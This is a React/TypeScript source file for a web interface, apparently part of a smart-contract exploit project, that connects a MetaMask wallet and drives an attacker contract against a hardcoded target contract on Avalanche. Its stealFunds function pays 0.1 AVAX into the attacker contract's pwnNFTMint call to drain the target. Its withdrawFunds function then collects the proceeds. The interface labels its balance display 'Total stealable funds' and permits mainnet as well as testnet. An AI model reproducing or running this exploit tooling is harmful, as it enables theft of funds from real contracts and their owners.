/* eslint-disable react-hooks/exhaustive-deps */
import { Web3Provider } from "@ethersproject/providers"
import fontawesome from "@fortawesome/fontawesome"
import { faTimes } from "@fortawesome/fontawesome-free-solid"
import { BigNumber, ethers } from "ethers"
import React, { useEffect } from "react"
import { toast, ToastContainer } from "react-toastify"
import "react-toastify/dist/ReactToastify.css"
import Nav from "../components/Nav"
import useMetaMask from "../hooks/useMetamask"
import pwnABI from "../resources/pwnContract.abi.json"
import { PwnNFT } from "../types"

fontawesome.library.add(faTimes)

const PWNER_CONTRACT = "0x745aD108798bC14C267096d0dd687FE6D9b3d004"

const App = () => {
  const { isActive, account, connector } = useMetaMask()

  const [contractAddress, _setContractAddress] = React.useState<string>("0xC09Ff9115C1CE86a3F1Bd501a625772fd299cd42")
  const [loading, setLoading] = React.useState<boolean>(false)
  const [balance, setBalance] = React.useState<BigNumber>(BigNumber.from(0))
  const [pwnerBalance, setPwnerBalance] = React.useState<BigNumber>(BigNumber.from(0))
  const [chainID, setChainID] = React.useState<number | string>()
  const [error, setError] = React.useState<string>("")

  async function loadContractInfo () {
    const provider = getProvider()
    try {
      const contractBalance = await provider.getBalance(contractAddress)
      const pwnerContractBalance = await provider.getBalance(PWNER_CONTRACT)

      setBalance(contractBalance)
      setPwnerBalance(pwnerContractBalance)
    } catch (e) {
      console.log("couldn't get balances", e)
      setError("Couldn't get contract for address: " + contractAddress)
    }
  }

  async function getChain () {
    let chainID = await connector.getChainId()
    if (typeof chainID === "string" && chainID.startsWith("0x")) chainID = toDec(chainID.substring(2))
    setChainID(chainID + "")
  }

  console.log({ connector })
  useEffect(() => {
    if (connector) {
      void getChain()
    }

    if (isActive && contractAddress) {
      setLoading(true)
      void loadContractInfo()
      setLoading(false)
    }
  }, [contractAddress, account, isActive, connector])

  async function stealFunds () {
    console.log("Stealing funds...")
    const provider = getProvider()
    const signer = provider.getSigner()

    const contract = await getPwnerContract(signer)

    const addr = signer.getAddress()
    await contract.connect(provider)

    // this code is sloppy
    toast
      .promise(
        contract
          .pwnNFTMint({ from: addr, value: ethers.utils.parseEther("0.1") })
          .then(tx => tx.wait())
          .then(txRcpt => {
            console.log("txRcpt", txRcpt)
            toast.success(
              <>
                Successfully pwned:{" "}
                <a
                  target='_blank'
                  rel='noreferrer'
                  style={{ color: "#0066FF" }}
                  href={`https://testnet.snowtrace.io/tx/${txRcpt.transactionHash}`}
                >
                  View in explorer
                </a>
              </>,
            )
          })
          .catch(e => alert("Unable to steal funds: " + e)),
        {
          pending: "Pwning...",
          success:
            "Successfully sent txn! I would put the txn hash here, but I will leave that for further improvement.",
          error: "Something went wrong",
        },
      )
      .catch(e => {
        console.error("Do we get it here too?", e)
      })
  }

  async function withdrawFunds () {
    const provider = getProvider()
    const signer = provider.getSigner()

    const contract = await getPwnerContract(signer)

    // please forgive me for this
    toast
      .promise(
        contract
          .gimmeEther()
          .then(tx => tx.wait())
          .then(txRcpt => {
            console.log("txRcpt", txRcpt)
            toast.success(
              <>
                Successfully pwned:{" "}
                <a
                  target='_blank'
                  rel='noreferrer'
                  style={{ color: "#0066FF" }}
                  href={`https://testnet.snowtrace.io/tx/${txRcpt.transactionHash}`}
                >
                  View in explorer
                </a>
              </>,
            )
          }),
        {
          pending: "Withdrawing funds",
          success:
            "Successfully sent txn! I would put the txn hash here, but I will leave that for further improvement.",
          error: "Something went wrong",
        },
      )
      .catch(e => {
        console.error("Do we get it here too?", e)
      })
  }

  console.log({ chainID })

  const canInteract = chainID === "43114" || chainID === "43113" // ONLY AVAX MAIN OR TESTNET

  return (
    <div style={{ marginBottom: 32, background: "transparent" }}>
      <ToastContainer />
      <Nav auth />
      <div
        className='container maxwidth-xs'
        data-aos='fade-in'
        style={{ marginTop: 120, textAlign: "center", background: "transparent", position: "relative", zIndex: 1 }}
      >
        <div className='gradient-background' style={{ zIndex: -1 }} />

        <div
          className='grid-container light-border column animate-resize'
          style={{
            borderRadius: 32,
            alignItems: "stretch",
            background: "radial-gradient(farthest-side at 90% 15%, #1F1557BB, #111628)",
            boxShadow: "rgb(255 255 255 / 20%) 0px 0px 15px, rgb(255 255 255 / 5%) 0px 0px 3px 1px",
          }}
        >
          <h3 className='main-text paragraph'>PwnNFT Contract Interface</h3>
          <hr className='paragraph'></hr>

          {error && (
            <p className='detail-text' style={{ fontSize: 12, color: "#ff6e6e", fontWeight: 600 }}>
              {error}
            </p>
          )}
          {
            <div className='paragraph' style={{ textAlign: "left" }}>
              <p className='detail-text'>Total stealable funds:</p>
              <h5>{loading ? "Loading Balance..." : ethers.utils.formatEther(balance.toString()) + "AVAX"} </h5>
            </div>
          }
          <button
            className={balance.gt(0) && canInteract ? "action-button" : "action-button smaller disabled"}
            onClick={stealFunds}
          >
            {!isActive
              ? "Connect your wallet"
              : canInteract
              ? balance.gt(0)
                ? "Steal funds"
                : "Contract is already drained!"
              : "Connect to AVAX main or testnet"}
          </button>
        </div>
        <button
          style={{ marginTop: 32 }}
          className={
            pwnerBalance.gt(0) && canInteract ? "action-button smaller squircle" : "action-button smaller disabled"
          }
          onClick={withdrawFunds}
        >
          {loading
            ? "Loading Balance..."
            : `Withdraw ${ethers.utils.formatEther(pwnerBalance.toString())} AVAX from NFTPwner`}
        </button>
      </div>
    </div>
  )
}

async function getPwnerContract (signer: ethers.Signer): Promise<PwnNFT> {
  const contract = new ethers.Contract(PWNER_CONTRACT, pwnABI.abi, signer) as PwnNFT
  return contract
}

let provider
function getProvider (): Web3Provider {
  if (!provider) provider = new ethers.providers.Web3Provider(window.ethereum)
  return provider
}

function toDec (num: string): number {
  return parseInt(num, 16)
}

export default App
